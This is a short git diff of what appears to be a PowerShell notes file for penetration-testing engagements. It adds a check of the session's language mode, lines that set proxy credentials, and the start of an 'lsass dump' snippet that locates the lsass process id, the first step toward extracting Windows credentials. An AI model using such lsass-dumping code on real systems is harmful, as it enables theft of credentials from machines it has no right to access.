@@ -3,9 +3,16 @@
 #Check if Full or Constrained Language Mode is in place.   
 $ExecutionContext.SessionState.LanguageMode
 
-Useful set of Powershell related commands during engagements
+#Set Proxy SEttings Manually in Powershell (enter in Creds)
 
-	$processes = Get-Process
+$Wcl=New-Object System.Net.WebClient
+$Creds=Get-Credential
+$Wcl.Proxy.Credentials=$Creds
+Invoke-WebRequest http://www.google.co.uk
+
+
+#lsass dump
+$processes = Get-Process
 	$location = Get-Location
 
 	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
